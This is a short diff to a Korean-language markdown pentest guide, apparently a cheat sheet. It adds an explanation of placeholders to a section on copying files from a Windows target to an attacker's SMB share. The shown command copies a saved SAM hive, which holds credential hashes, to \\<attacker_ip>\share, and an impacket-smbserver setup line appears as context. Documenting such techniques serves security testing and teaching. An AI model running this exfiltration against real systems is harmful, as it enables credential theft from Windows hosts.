@@ -43,6 +43,8 @@ sudo impacket-smbserver share /tmp/smbshare -smb2support -username test -passwor
 
 ### Windows 대상에서 공격자 share로 파일 복사
 
+`<attacker_ip>`는 Windows client가 접속할 Linux SMB server 주소(예: `smbserver.example.test`)다. `share`는 server 명령에서 만든 share 이름, `/tmp/smbshare`는 Linux server의 로컬 디렉터리, `C:\Windows\Temp\sam.save`는 Windows client의 source path다.
+
 ```cmd
 copy C:\Windows\Temp\sam.save \\<attacker_ip>\share\sam.save
 ```
